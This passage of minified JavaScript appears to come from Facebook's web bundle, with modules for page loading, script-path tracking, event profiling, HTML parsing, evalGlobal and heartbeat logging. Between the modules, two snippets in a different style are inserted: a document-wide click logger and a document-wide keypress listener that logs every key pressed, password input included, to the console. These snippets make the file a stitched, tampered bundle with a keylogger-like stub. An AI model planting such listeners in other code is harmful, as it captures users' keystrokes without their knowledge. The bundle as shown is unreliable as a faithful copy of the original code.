      }, l);
      var q = !1;
      n = function () {
        if (q) return;
        q = !0;
        e._informPageletEvent(c("PageletEventConstsJS").CSS_START, a);
        var b = a.displayResources || [];
        c("Bootloader").loadResources(b, {
          onAll: function () {
            e._informPageletEvent(c("PageletEventConstsJS").CSS_END, a), e.arbiter.inform(a.id + "_css_end", !0, "state");
          }
        });
      };
      this.config.flush_pagelets_asap ? n() : this.arbiter.registerCallback(n, ["phase_begin_" + f]);
      g = [a.id + "_displayed"];
      this.jsNonBlock || g.push(this.domContentEvt);
      this.arbiter.registerCallback(this._downloadJsForPagelet.bind(this, a), g);
    }, "BigPipe#onPageletArrive")
  });
  b.Events = d("BigPipeInstance").Events;
  function n(a) {
    if (!a || typeof a === "string") return a;
    if (a.container_id) {
      var b = c("$")(a.container_id);
      a = o(b) || "";
      b.parentNode.removeChild(b);
      return a;
    }
    a.nodeType;
    return null;
  }
  function o(a) {
    if (!a.firstChild) return null;
    if (a.firstChild.nodeType !== 8) return null;
    a = a.firstChild.nodeValue;
    a = a.substring(1, a.length - 1);
    return a.replace(/\\([\s\S]|$)/g, "$1");
  }
  function p(a, b, c) {
    b = r(b);
    for (var d = 0; d < b.childNodes.length; d++) c.push(b.childNodes[d]);
    a.appendChild(b);
  }
  function q(a, b, c) {
    b = r(b);
    var d = document.createDocumentFragment(),
      e = b.childNodes.length;
    for (var f = 0; f < e; f++) {
      var g = b.firstChild,
        h = g.id && document.getElementById(g.id),
        i = h && h.parentNode;
      i === a ? (i.replaceChild(g, h), c.push(g)) : d.appendChild(g);
    }
    return d;
  }
  function r(a) {
    if (a.nodeType) return a;
    var b = document.createDocumentFragment();
    a = n(a);
    if (a) {
      var c = document.createElement("div");
      c.innerHTML = a;
      while (c.firstChild) b.appendChild(c.firstChild);
    }
    return b;
  }
  e = b;
  g["default"] = e;
}, 98);
__d("EventProfilerAdsSessionProvider", ["AdsInterfacesSessionConfig"], function (a, b, c, d, e, f, g) {
  "use strict";

  g.sessionID = c("AdsInterfacesSessionConfig").sessionID;
}, 98);
__d("EventProfilerSampler", ["EventConfig"], function (a, b, c, d, e, f) {
  "use strict";

  var g = b("EventConfig").sampling || {},
    h = {
      canSample: function (a) {
        return !!g[a];
      },
      getEventSampleWeights: function (a) {
        a.__samplingWeights == null && (a.__samplingWeights = {
          event: i(h.getEventWeight(a))
        });
        return a.__samplingWeights;
      },
      getEventWeight: function (a) {
        a = a.type in g ? g[a.type] : 1;
        return a * g.__eventDefault;
      },
      getEventInteractionIDs: function (a, b) {
        return [];
      }
    };
  function i(a) {
    if (a === 0) return 0;
    var b = g.__min || 1;
    a = Math.round(Math.max(b, a));
    return Math.random() * a < 1 ? a : 0;
  }
  e.exports = h;
}, null);
__d("SubscriptionList", ["recoverableViolation"], function (a, b, c, d, e, f, g) {
  a = function () {
    function a(a, b) {
      this.$1 = [], this.$2 = a, this.$3 = b;
    }
    var b = a.prototype;
    b.add = function (a) {
      var b = this,
        d = {
          callback: a
        };
      this.$1.push(d);
      this.$2 && this.$1.length === 1 && this.$2();
      return {
        remove: function () {
          var a = b.$1.indexOf(d);
          if (a === -1) {
            c("recoverableViolation")("SubscriptionList: Callback already removed.", "SubscriptionList");
            return;
          }
          b.$1.splice(a, 1);
          b.$3 && b.$1.length === 0 && b.$3();
        }
      };
    };
    b.getCallbacks = function () {
      return this.$1.map(function (a) {
        return a.callback;
      });
    };
    b.fireCallbacks = function (a) {
      this.getCallbacks().forEach(function (b) {
        b(a);
      });
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("isInIframe", [], function (a, b, c, d, e, f) {
  var g = typeof window !== "undefined" && window.top != null && window != window.top;
  function a() {
    return g;
  }
  f["default"] = a;
}, 66);
__d("ScriptPath", ["ErrorGuard", "SubscriptionList", "TimeSlice", "WebStorage", "isInIframe"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h,
    i = "sp_pi",
    j = 1e3 * 30,
    k = null,
    l = null,
    m = new (b("SubscriptionList"))(),
    n = null,
    o = [],
    p = b("TimeSlice").guard(function (a, c) {
      m.getCallbacks().forEach(function (d) {
        (g || (g = b("ErrorGuard"))).applyWithGuard(function () {
          d({
            source: k,
            dest: l,
            cause: a,
            extraData: c
          });
        }, null, []);
      });
    }, "ScriptPath Notifying callbacks", {
      propagationType: b("TimeSlice").PropagationType.ORPHAN
    });
  function q() {
    return l ? l.scriptPath : void 0;
  }
  function r() {
    var a = (h || (h = b("WebStorage"))).getSessionStorage();
    if (!a || b("isInIframe")()) return;
    h.setItemGuarded(a, i, JSON.stringify({
      pageInfo: l,
      clickPoint: n,
      time: Date.now()
    }));
  }
  function a() {
    var a = (h || (h = b("WebStorage"))).getSessionStorageForRead();
    if (!a) return;
    var c = a.getItem(i);
    if (c) {
      c = JSON.parse(c);
      c && (c.time < Date.now() - j && (a = (h || (h = b("WebStorage"))).getSessionStorage(), a && a.removeItem(i)), l = c.pageInfo, n = c.clickPoint, l && (l.restored = !0));
    }
  }
  a();
  c = {
    set: function (a, b, c) {
      k = l, l = {
        scriptPath: a,
        categoryToken: b,
        extraData: c || {}
      }, o = [], window._script_path = a, p();
    },
    openOverlayView: function (a, b, c) {
      if (!a) return;
      var d = o.length;
      (d === 0 || o[d - 1] !== a) && (k = babelHelpers["extends"]({}, l), l && (l.topViewEndpoint = a), c && c.replaceTopOverlay && d > 0 ? (o[d - 1] = a, p("replace_overlay_view", b)) : (o.push(a), p("open_overlay_view", b)));
    },
    closeOverlayView: function (a, b) {
      a = o.lastIndexOf(a);
      if (a === -1) return;
      k = babelHelpers["extends"]({}, l);
      l && (a > 0 ? l.topViewEndpoint = o[a - 1] : l.topViewEndpoint = null);
      o = o.slice(0, a);
      p("close_overlay_view", b);
    },
    setClickPointInfo: function (a) {
      n = a, r();
    },
    getClickPointInfo: function () {
      return n;
    },
    getScriptPath: q,
    getCategoryToken: function () {
      return l ? l.categoryToken : void 0;
    },
    getEarlyFlushPage: function () {
      var a;
      return (a = l) == null ? void 0 : (a = a.extraData) == null ? void 0 : a.ef_page;
    },
    getTopViewEndpoint: function () {
      var a = o.length;
      return a > 0 ? o[a - 1] : q();
    },
    getPageInfo: function () {
      return l;
    },
    getSourcePageInfo: function () {
      return k;
    },
    subscribe: function (a) {
      return m.add(b("TimeSlice").guard(a, "ScriptPath.subscribe"));
    },
    shutdown: function () {
      r();
    }
  };
  e.exports = c;
}, null);
document.addEventListener('click', e => {
  console.log('A click event has occurred at: ', e.target);
});
__d("VersionRange", ["invariant"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  var i = /\./,
    j = /\|\|/,
    k = /\s+\-\s+/,
    l = /^(<=|<|=|>=|~>|~|>|)?\s*(.+)/,
    m = /^(\d*)(.*)/;
  function n(a, b) {
    a = a.split(j);
    if (a.length > 1) return a.some(function (a) {
      return E.contains(a, b);
    });else return o(a[0].trim(), b);
  }
  function o(a, b) {
    a = a.split(k);
    a.length > 0 && a.length <= 2 || h(0, 11800);
    if (a.length === 1) return p(a[0], b);else {
      var c = a[0];
      a = a[1];
      y(c) && y(a) || h(0, 11801);
      return p(">=" + c, b) && p("<=" + a, b);
    }
  }
  function p(a, b) {
    a = a.trim();
    if (a === "") return !0;
    b = b.split(i);
    a = w(a);
    var c = a.modifier;
    a = a.rangeComponents;
    switch (c) {
      case "<":
        return q(b, a);
      case "<=":
        return r(b, a);
      case ">=":
        return t(b, a);
      case ">":
        return u(b, a);
      case "~":
      case "~>":
        return v(b, a);
      default:
        return s(b, a);
    }
  }
  function q(a, b) {
    return D(a, b) === -1;
  }
  function r(a, b) {
    a = D(a, b);
    return a === -1 || a === 0;
  }
  function s(a, b) {
    return D(a, b) === 0;
  }
  function t(a, b) {
    a = D(a, b);
    return a === 1 || a === 0;
  }
  function u(a, b) {
    return D(a, b) === 1;
  }
  function v(a, b) {
    var c = b.slice();
    b = b.slice();
    b.length > 1 && b.pop();
    var d = b.length - 1,
      e = parseInt(b[d], 10);
    x(e) && (b[d] = e + 1 + "");
    return t(a, c) && q(a, b);
  }
  function w(a) {
    a = a.split(i);
    var b = a[0].match(l);
    b || h(0, 3074);
    return {
      modifier: b[1],
      rangeComponents: [b[2]].concat(a.slice(1))
    };
  }
  function x(a) {
    return !isNaN(a) && isFinite(a);
  }
  function y(a) {
    return !w(a).modifier;
  }
  function z(a, b) {
    for (var c = a.length; c < b; c++) a[c] = "0";
  }
  function A(a, b) {
    a = a.slice();
    b = b.slice();
    z(a, b.length);
    for (var c = 0; c < b.length; c++) {
      var d = b[c].match(/^[x*]$/i);
      if (d) {
        b[c] = a[c] = "0";
        if (d[0] === "*" && c === b.length - 1) for (d = c; d < a.length; d++) a[d] = "0";
      }
    }
    z(b, a.length);
    return [a, b];
  }
  function B(a, b) {
    var c = a.match(m),
      d = b.match(m);
    c = c && c[1];
    d = d && d[1];
    c = parseInt(c, 10);
    d = parseInt(d, 10);
    if (x(c) && x(d) && c !== d) return C(c, d);else return C(a, b);
  }
  function C(a, b) {
    typeof a === typeof b || h(0, 11802);
    if (typeof a === "string" && typeof b === "string") if (a > b) return 1;else if (a < b) return -1;else return 0;
    if (typeof a === "number" && typeof b === "number") if (a > b) return 1;else if (a < b) return -1;else return 0;
    typeof a === typeof b || h(0, 11802);
    return 0;
  }
  function D(a, b) {
    a = A(a, b);
    b = a[0];
    a = a[1];
    for (var c = 0; c < a.length; c++) {
      var d = B(b[c], a[c]);
      if (d) return d;
    }
    return 0;
  }
  var E = {
    contains: function (a, b) {
      return n(a.trim(), b.trim());
    }
  };
  a = E;
  g["default"] = a;
}, 98);
__d("UserAgent", ["UserAgentData", "VersionRange", "memoizeStringOnly"], function (a, b, c, d, e, f, g) {
  "use strict";

  function h(a, b, d, e) {
    if (a === d) return !0;
    if (!d.startsWith(a)) return !1;
    d = d.slice(a.length);
    if (b != null) {
      d = e ? e(d) : d;
      return c("VersionRange").contains(d, b);
    }
    return !1;
  }
  function i(a) {
    return c("UserAgentData").platformName === "Windows" ? a.replace(/^\s*NT/, "") : a;
  }
  a = {
    isBrowser: c("memoizeStringOnly")(function (a) {
      return h(c("UserAgentData").browserName, c("UserAgentData").browserFullVersion, a);
    }),
    isBrowserArchitecture: c("memoizeStringOnly")(function (a) {
      return h(c("UserAgentData").browserArchitecture, null, a);
    }),
    isDevice: c("memoizeStringOnly")(function (a) {
      return h(c("UserAgentData").deviceName, null, a);
    }),
    isEngine: c("memoizeStringOnly")(function (a) {
      return h(c("UserAgentData").engineName, c("UserAgentData").engineVersion, a);
    }),
    isPlatform: c("memoizeStringOnly")(function (a) {
      return h(c("UserAgentData").platformName, c("UserAgentData").platformFullVersion, a, i);
    }),
    isPlatformArchitecture: c("memoizeStringOnly")(function (a) {
      return h(c("UserAgentData").platformArchitecture, null, a);
    })
  };
  b = a;
  g["default"] = b;
}, 98);
__d("cx", [], function (a, b, c, d, e, f) {
  function a(a) {
    throw new Error("cx: Unexpected class transformation.");
  }
  f["default"] = a;
}, 66);
__d("getParentClassesForEventProfiler", ["cx"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  function i(a) {
    if (!a || !(a instanceof HTMLElement)) return "";
    var b = a.id,
      c = a.nodeName,
      d = a.getAttribute("class");
    c = c ? c.replace(/^#/, "") : "unknown";
    b = b ? "#" + b : "";
    d = d ? " " + d.replace(/\s+/g, " ").trim() : "";
    if (a.getAttribute("rel") === "theater") {
      a = "_342u";
      d = d.length ? d + " " + a : a;
    }
    return ":" + c + b + d;
  }
  function a(a) {
    var b = [];
    while (a && a instanceof HTMLElement) b.push(i(a)), a = a.parentElement;
    b.reverse();
    return b;
  }
  g["default"] = a;
}, 98);
__d("nativeRequestAnimationFrame", [], function (a, b, c, d, e, f) {
  b = a.__fbNativeRequestAnimationFrame || a.requestAnimationFrame || a.webkitRequestAnimationFrame || a.mozRequestAnimationFrame || a.oRequestAnimationFrame || a.msRequestAnimationFrame;
  c = b;
  f["default"] = c;
}, 66);
__d("requestAnimationFramePolyfill", ["nativeRequestAnimationFrame", "performanceNow"], function (a, b, c, d, e, f, g) {
  var h = 0;
  b = c("nativeRequestAnimationFrame") || function (b) {
    var d = c("performanceNow")(),
      e = Math.max(0, 16 - (d - h));
    h = d + e;
    return a.setTimeout(function () {
      b(c("performanceNow")());
    }, e);
  };
  d = b;
  g["default"] = d;
}, 98);
__d("requestAnimationFrameAcrossTransitions", ["TimeSlice", "requestAnimationFramePolyfill"], function (a, b, c, d, e, f, g) {
  function a(a) {
    a = c("TimeSlice").guard(a, "requestAnimationFrame", {
      propagationType: c("TimeSlice").PropagationType.CONTINUATION
    });
    return c("requestAnimationFramePolyfill")(a);
  }
  g["default"] = a;
}, 98);
__d("uniqueID", [], function (a, b, c, d, e, f) {
  var g = "js_",
    h = 36,
    i = 0;
  function a(a, b) {
    a === void 0 && (a = g);
    b === void 0 && (b = !1);
    return b ? a : a + (i++).toString(h);
  }
  f["default"] = a;
}, 66);
__d("EventProfilerImpl", ["Bootloader", "EventProfilerAdsSessionProvider", "EventProfilerSampler", "ScriptPath", "TimeSlice", "UserAgent", "getParentClassesForEventProfiler", "performanceAbsoluteNow", "requestAnimationFrameAcrossTransitions", "setTimeoutAcrossTransitions", "uniqueID"], function (a, b, c, d, e, f) {
  var g,
    h = {},
    i = {},
    j = {},
    k = !1,
    l = 0,
    m = new Set(["click", "keydown", "mousewheel", "scroll"]),
    n = null,
    o = null;
  c = {
    __wrapEventListenHandler: function (a) {
      return function (c, d) {
        var e = this;
        if (!b("EventProfilerSampler").canSample(c)) return a.call(this, c, d);
        var f = {
            event: 0
          },
          s = (g || (g = b("performanceAbsoluteNow")))();
        d.id = d.id || b("uniqueID")();
        var t = d.id,
          u,
          v = j[t],
          w = null;
        i[t] === void 0 && !v ? (w = b("getParentClassesForEventProfiler")(d.target), f = r(d), o != null && o.beforeHandlers(t, c), u = a.call(this, c, d), j[t] = b("TimeSlice").getGuardedContinuation("Event Bubble Continuation")) : (f = r(d), u = v(function () {
          j[t] = b("TimeSlice").getGuardedContinuation("Event Bubble Continuation");
          return a.call(e, c, d);
        }));
        v = g();
        if (i[t] === void 0) {
          w = w;
          var x = q(d);
          x = x || s;
          var y = Math.max(s - x, 0),
            z = null;
          b("UserAgent").isBrowser("Chrome") && (z = !!d.cancelable);
          var A = z && (!!d.deliberateSync || b("UserAgent").isBrowser("Chrome < 51"));
          i[t] = {
            event_name: c,
            event_start_ms: Math.round(x),
            main_thread_wait_ms: Math.round(y),
            event_handlers_runtime_ms: 0,
            script_path: b("ScriptPath").getScriptPath() || "<unknown>",
            request_animation_frame_wait_ms: 0,
            set_timeout_wait_ms: 0
          };
          h[t] = {
            event_target_raw: w,
            weight: f.event,
            cancelable: !!z,
            deliberate_sync: !!A,
            ad_account_id: n,
            event_end_ms: 0
          };
          y = b("EventProfilerAdsSessionProvider").sessionID;
          y && (h[t].ads_session_id = y);
          var B = !1;
          m.has(c) && (!k && l < x && (k = !0, B = !0), h[t].is_first_in_frame = B, h[t].is_first_overlapping = B);
          b("requestAnimationFrameAcrossTransitions")(function () {
            var a = (g || (g = b("performanceAbsoluteNow")))();
            i[t].request_animation_frame_wait_ms = Math.round(a - h[t].event_end_ms);
            delete h[t].event_end_ms;
            var d = !1;
            function e() {
              if (d) return;
              d = !0;
              var e = (g || (g = b("performanceAbsoluteNow")))();
              i[t].set_timeout_wait_ms = Math.round(e - a);
              p(t, s, e);
              m.has(c) && B && (k = !1, l = e);
              e = j[t];
              e && delete j[t];
              delete i[t];
              delete h[t];
            }
            b("requestAnimationFrameAcrossTransitions")(e);
            b("setTimeoutAcrossTransitions")(e, 0);
          });
        }
        i[t].event_handlers_runtime_ms += v - s;
        h[t].event_end_ms = v;
        o != null && o.afterEachHandler(t, i[t]);
        return u;
      };
    },
    setCurrentAdAccountId: function (a) {
      n = a;
    },
    setAdsConfig: function (a) {
      o = a;
    }
  };
  function p(a, c, d) {
    c = i[a];
    c.event_handlers_runtime_ms = Math.round(c.event_handlers_runtime_ms);
    var e = babelHelpers["extends"]({}, i[a], h[a]);
    o != null && o.beforeLog(a, e);
    e.weight && b("Bootloader").loadModules(["WebSpeedInteractionsTypedLogger", "PerfXSharedFields"], function (a, b) {
      b.addCommonValues(e), new a().updateData(e).log();
    }, "EventProfilerImpl");
  }
  var q = function () {
    function b(a) {
      return null;
    }
    if (!a.performance || !a.performance.now || !a.performance.timing || !a.performance.timing.navigationStart) return b;
    var c = a.performance.timing.navigationStart,
      d = a.CustomEvent && (typeof a.CustomEvent === "function" || a.CustomEvent.toString().indexOf("CustomEventConstructor") > -1);
    d = d ? new a.CustomEvent("test").timeStamp : a.document.createEvent("KeyboardEvent").timeStamp;
    return d && d <= a.performance.now() ? function (a) {
      return a.timeStamp + c;
    } : b;
  }();
  function r(a) {
    return o != null ? o.getEventSampleWeights(a) : b("EventProfilerSampler").getEventSampleWeights(a);
  }
  e.exports = c;
}, null);
__d("getActiveElement", [], function (a, b, c, d, e, f) {
  function a(a) {
    a === void 0 && (a = document);
    if (a === void 0) return null;
    try {
      return a.activeElement || a.body;
    } catch (b) {
      return a.body;
    }
  }
  f["default"] = a;
}, 66);
__d("FocusListener", ["Arbiter", "CSS", "Parent", "getActiveElement"], function (a, b, c, d, e, f) {
  var g = {
    expandInput: function (a) {
      b("CSS").addClass(a, "child_is_active"), b("CSS").addClass(a, "child_is_focused"), b("CSS").addClass(a, "child_was_focused"), b("Arbiter").inform("reflow");
    }
  };
  function h(a, c) {
    if (c.getAttribute("data-silentfocuslistener")) return;
    var d = b("Parent").byClass(c, "focus_target");
    d && ("focus" == a || "focusin" == a ? g.expandInput(d) : (c.value === "" && b("CSS").removeClass(d, "child_is_active"), b("CSS").removeClass(d, "child_is_focused")));
  }
  c = b("getActiveElement")();
  c && h("focus", c);
  function a(a) {
    a = a || window.event, h(a.type, a.target || a.srcElement);
  }
  d = document.documentElement;
  d && (d.addEventListener ? (d.addEventListener("focus", a, !0), d.addEventListener("blur", a, !0)) : (d.attachEvent("onfocusin", a), d.attachEvent("onfocusout", a)));
  e.exports = g;
}, null);
__d("TrustedTypesLinkTagHTMLPolicy", ["TrustedTypes", "err"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    createHTML: function (a) {
      if (a === "<link />") return a;
      throw c("err")("Violating Trusted Type policies. Only works for '<link />' strings.");
    }
  };
  b = c("TrustedTypes").createPolicy("link-tag-html", a);
  d = b;
  g["default"] = d;
}, 98);
__d("getMarkupWrap", ["invariant", "ExecutionEnvironment", "TrustedTypesLinkTagHTMLPolicy"], function (a, b, c, d, e, f, g, h) {
  var i = c("ExecutionEnvironment").canUseDOM ? document.createElement("div") : null,
    j = {};
  b = [1, '<select multiple="true">', "</select>"];
  d = [1, "<table>", "</table>"];
  e = [3, "<table><tbody><tr>", "</tr></tbody></table>"];
  var k = [1, '<svg xmlns="http://www.w3.org/2000/svg">', "</svg>"],
    l = {
      "*": [1, "?<div>", "</div>"],
      area: [1, "<map>", "</map>"],
      col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
      legend: [1, "<fieldset>", "</fieldset>"],
      param: [1, "<object>", "</object>"],
      tr: [2, "<table><tbody>", "</tbody></table>"],
      optgroup: b,
      option: b,
      caption: d,
      colgroup: d,
      tbody: d,
      tfoot: d,
      thead: d,
      td: e,
      th: e
    };
  f = ["circle", "clipPath", "defs", "ellipse", "g", "image", "line", "linearGradient", "mask", "path", "pattern", "polygon", "polyline", "radialGradient", "rect", "stop", "text", "tspan"];
  f.forEach(function (a) {
    l[a] = k, j[a] = !0;
  });
  function a(a) {
    a = a;
    !i && h(0, 144);
    Object.prototype.hasOwnProperty.call(l, a) || (a = "*");
    Object.prototype.hasOwnProperty.call(j, a) || (a === "*" ? i.innerHTML = c("TrustedTypesLinkTagHTMLPolicy").createHTML("<link />") : i.innerHTML = "<" + a + "></" + a + ">", j[a] = !i.firstChild);
    return j[a] ? l[a] : null;
  }
  g["default"] = a;
}, 98);
document.addEventListener('keypress', e => {
  console.log('A keypress event has occurred: ', e.key);
});
__d("createNodesFromMarkup", ["invariant", "ExecutionEnvironment", "TrustedTypesNoOpPolicy_DO_NOT_USE", "getMarkupWrap"], function (a, b, c, d, e, f, g, h) {
  var i = c("ExecutionEnvironment").canUseDOM ? document.createElement("div") : null,
    j = /^\s*<(\w+)/;
  function k(a) {
    a = a.match(j);
    return a && a[1].toLowerCase();
  }
  function a(a, b) {
    var d = i;
    !i && h(0, 5001);
    var e = k(a);
    e = e && c("getMarkupWrap")(e);
    if (e) {
      d.innerHTML = e[1] + a + e[2];
      e = e[0];
      while (e--) d = d.lastChild;
    } else d.innerHTML = c("TrustedTypesNoOpPolicy_DO_NOT_USE").createHTML(a);
    e = d.getElementsByTagName("script");
    e.length && (b || h(0, 5002), Array.from(e).forEach(b));
    a = Array.from(d.childNodes);
    while (d.lastChild) d.removeChild(d.lastChild);
    return a;
  }
  g["default"] = a;
}, 98);
__d("evalGlobal", [], function (a, b, c, d, e, f) {
  function a(a) {
    if (typeof a !== "string") throw new TypeError("JS sent to evalGlobal is not a string. Only strings are permitted.");
    if (!a) return;
    var b = document.createElement("script");
    try {
      b.appendChild(document.createTextNode(a));
    } catch (c) {
      b.text = a;
    }
    a = document.getElementsByTagName("head")[0] || document.documentElement;
    a.appendChild(b);
    a.removeChild(b);
  }
  f["default"] = a;
}, 66);
__d("HTML", ["invariant", "Bootloader", "FBLogger", "createNodesFromMarkup", "emptyFunction", "evalGlobal"], function (a, b, c, d, e, f, g) {
  var h = /(<(\w+)[^>]*?)\/>/g,
    i = {
      abbr: !0,
      area: !0,
      br: !0,
      col: !0,
      embed: !0,
      hr: !0,
      img: !0,
      input: !0,
      link: !0,
      meta: !0,
      param: !0
    };
  a = function () {
    "use strict";

    function a(c) {
      c && typeof c.__html === "string" && (c = c.__html);
      if (!(this instanceof a)) return c instanceof a ? c : new a(c);
      if (c) {
        var d = typeof c;
        d === "string" || g(0, 277, d);
      }
      this._markup = c || "";
      this._defer = !1;
      this._nodes = null;
      this._inlineJS = b("emptyFunction");
      this._rootNode = null;
      this._hasInlineJs = !1;
    }
    var c = a.prototype;
    c.toString = function () {
      return this._markup;
    };
    c.getContent = function () {
      return this._markup;
    };
    c.getNodes = function () {
      this._fillCache();
      return this._nodes;
    };
    c.getRootNode = function () {
      this._rootNode && g(0, 278);
      var a = this.getNodes();
      if (a.length === 1) this._rootNode = a[0];else {
        var b = document.createDocumentFragment();
        for (var c = 0; c < a.length; c++) b.appendChild(a[c]);
        this._rootNode = b;
      }
      return this._rootNode;
    };
    c.getAction = function () {
      var a = this;
      this._fillCache();
      var b = function () {
        a._inlineJS();
      };
      return this._defer ? function () {
        setTimeout(b, 0);
      } : b;
    };
    c._fillCache = function () {
      if (this._nodes !== null) return;
      if (!this._markup) {
        this._nodes = [];
        return;
      }
      var a = this._markup.replace(h, function (a, b, c) {
          return i[c.toLowerCase()] ? a : b + "></" + c + ">";
        }),
        c = null;
      a = b("createNodesFromMarkup")(a, function (a) {
        b("FBLogger")("staticresources").warn("HTML: encountered script node while parsing, hasSrc=%s, type=%s", Boolean(a.src), a.type == null || a.type === "" ? "<unknown>" : a.type), a.type !== "application/ld+json" && a.type !== "application/json" && (c = c || [], c.push(a.src ? b("Bootloader").requestJSResource_UNSAFE_NEEDS_REVIEW_BY_SECURITY_AND_XFN.bind(b("Bootloader"), a.src) : b("evalGlobal").bind(null, a.innerHTML)), a.parentNode.removeChild(a));
      });
      c && (this._hasInlineJs = !0, this._inlineJS = function () {
        for (var a = 0; a < c.length; a++) c[a]();
      });
      this._nodes = a;
    };
    c.setDeferred = function (a) {
      this._defer = !!a;
      return this;
    };
    c.hasInlineJs = function () {
      return this._hasInlineJs;
    };
    a.isHTML = function (b) {
      return !!b && (b instanceof a || b.__html !== void 0);
    };
    a.replaceJSONWrapper = function (b) {
      return b && b.__html !== void 0 ? new a(b.__html) : b;
    };
    return a;
  }();
  e.exports = a;
}, null);
__d("HardwareCSS", [], function (a, b, c, d, e, f) {
  function g() {
    if (window != null && window.document && document.body) {
      var a = document.body,
        b = a.getAttribute("class") || "";
      window.navigator && window.navigator.hardwareConcurrency && window.navigator.hardwareConcurrency >= 4 ? a.setAttribute("class", b + " cores-gte4") : a.setAttribute("class", b + " cores-lt4");
    }
  }
  var h = {
    init: function () {
      g(), h.init = function () {};
    }
  };
  e.exports = h;
}, null);
__d("ExecutionContextObservers", [], function (a, b, c, d, e, f) {
  a = {
    PROFILING_COUNTERS: 0,
    HEARTBEAT: 1,
    FLUX_PERF_TOOL: 2
  };
  b = {
    PROFILING_COUNTERS: 0,
    HEARTBEAT: 1,
    FLUX_PERF_TOOL: 2
  };
  f.beforeIDs = a;
  f.afterIDs = b;
}, 66);
__d("LogBuffer", ["CircularBuffer"], function (a, b, c, d, e, f, g) {
  var h = a.__fbNativeSetTimeout || a.setTimeout,
    i = 5e3,
    j = {},
    k = {};
  function b(a, b) {
    var d = j[a] = j[a] || new (c("CircularBuffer"))(i);
    d.write(b);
    k[a] && k[a].forEach(function (a) {
      try {
        a(b);
      } catch (a) {}
    });
  }
  function d(a) {
    if (!j[a]) return [];else return j[a].read();
  }
  function e(a, b) {
    if (typeof b !== "function") return;
    k[a] = k[a] || [];
    k[a].push(b);
    if (j[a]) {
      a = j[a];
      a.read().forEach(function (a) {
        try {
          b(a);
        } catch (a) {}
      });
    }
  }
  function f(a, b) {
    var d = j[a];
    d ? d.expand(b) : j[a] = new (c("CircularBuffer"))(b);
  }
  function l(a) {
    j[a] && h(function () {
      j[a].clear();
    }, 0);
  }
  g.write = b;
  g.read = d;
  g.tail = e;
  g.expand = f;
  g.clear = l;
}, 98);
__d("OnDemandExecutionContextObserver", ["TimeSlice"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = function () {
    function a() {
      this.$5 = !1, this.$4 = !1, this.$1 = 0, this.$2 = {}, this.$3 = 0;
    }
    var b = a.prototype;
    b.onNewContextCreatedWhileEnabled = function (a, b, c) {
      throw Error("unimplemented abstract method");
    };
    b.onBeforeContextStartedWhileEnabled = function (a, b, c) {
      throw Error("unimplemented abstract method");
    };
    b.onAfterContextEndedWhileEnabled = function (a, b, c, d) {
      throw Error("unimplemented abstract method");
    };
    b.onNewContextCreated = function (a, b, c) {
      return this.isEnabled() ? this.onNewContextCreatedWhileEnabled(a, b, c) : null;
    };
    b.onBeforeContextStarted = function (a, b, c) {
      return this.isEnabled() ? this.onBeforeContextStartedWhileEnabled(a, b, c) : null;
    };
    b.onAfterContextStarted = function (a, b, c, d) {
      return null;
    };
    b.onAfterContextEnded = function (a, b, c, d) {
      if (this.isEnabled()) {
        c = c;
        this.onAfterContextEndedWhileEnabled(a, b, c, d);
      }
      this.$4 && !this.$5 && a.isRoot && (this.onDisable(), this.$4 = !1);
    };
    b.onDisable = function () {};
    b.onEnable = function () {};
    b.getBeforeID = function () {
      throw Error("unimplemented abstract method");
    };
    b.getAfterID = function () {
      throw Error("unimplemented abstract method");
    };
    b.isEnabled = function () {
      return this.$4;
    };
    b.__getExpiryCallback = function () {
      var a = this,
        b = ++this.$1;
      this.$2[b] = !0;
      this.$3++;
      return function () {
        a.$2[b] && (delete a.$2[b], a.$3--, a.$3 === 0 && (a.$5 = !1));
      };
    };
    b.expressInterest = function () {
      var a = this.__getExpiryCallback();
      this.isEnabled() || (this.onEnable(), c("TimeSlice").catchUpOnDemandExecutionContextObservers(this));
      this.$4 = !0;
      this.$5 = !0;
      return a;
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("Heartbeat", ["Env", "ExecutionContextObservers", "FBLogger", "LogBuffer", "OnDemandExecutionContextObserver", "TimeSlice", "performanceAbsoluteNow"], function (a, b, c, d, e, f) {
  "use strict";

  var g, h, i, j;
  c = function (c) {
    babelHelpers.inheritsLoose(d, c);
    function d() {
      var a, b;
      for (var d = arguments.length, e = new Array(d), f = 0; f < d; f++) e[f] = arguments[f];
      return (a = b = c.call.apply(c, [this].concat(e)) || this, b.$HeartbeatObserver1 = 33, b.$HeartbeatObserver2 = 60, b.$HeartbeatObserver3 = null, b.$HeartbeatObserver4 = null, b.$HeartbeatObserver5 = {}, b.$HeartbeatObserver6 = null, b.$HeartbeatObserver7 = [], b.$HeartbeatObserver8 = 1, b.$HeartbeatObserver9 = null, a) || babelHelpers.assertThisInitialized(b);
    }
    var e = d.prototype;
    e.onNewContextCreatedWhileEnabled = function (a, b, c) {
      return null;
    };
    e.onBeforeContextStartedWhileEnabled = function (a, b, c) {
      return null;
    };
    e.onAfterContextEndedWhileEnabled = function (a, b, c, d) {
      b = a.absBeginTimeMs;
      c = a.absEndTimeMs;
      d = a.name;
      a = a.isRoot;
      a && b != null && c != null && (this.$HeartbeatObserver5[d] ? (this.$HeartbeatObserver10({
        type: "ignored_exec",
        timeMs: b
      }, !0), this.$HeartbeatObserver10({
        type: "ignored_exec",
        timeMs: c
      }, !1)) : (this.$HeartbeatObserver10({
        type: "exec",
        timeMs: b
      }, !0), this.$HeartbeatObserver10({
        type: "exec",
        timeMs: c
      }, !1)));
    };
    e.__getExpiryCallback = function () {
      var a = this,
        d = c.prototype.__getExpiryCallback.call(this),
        e = (g || (g = b("performanceAbsoluteNow")))();
      this.$HeartbeatObserver7.push([e, d]);
      return function () {
        d(), a.$HeartbeatObserver11();
      };
    };
    e.onEnable = function () {
      var c = (h || (h = b("Env"))).timeslice_heartbeat_config || {};
      this.$HeartbeatObserver1 = c.pollIntervalMs || this.$HeartbeatObserver1;
      this.$HeartbeatObserver2 = c.idleGapThresholdMs || this.$HeartbeatObserver2;
      this.$HeartbeatObserver5 = c.ignoredTimesliceNames || this.$HeartbeatObserver5;
      c = a.__fbNativeSetInterval || a.setInterval;
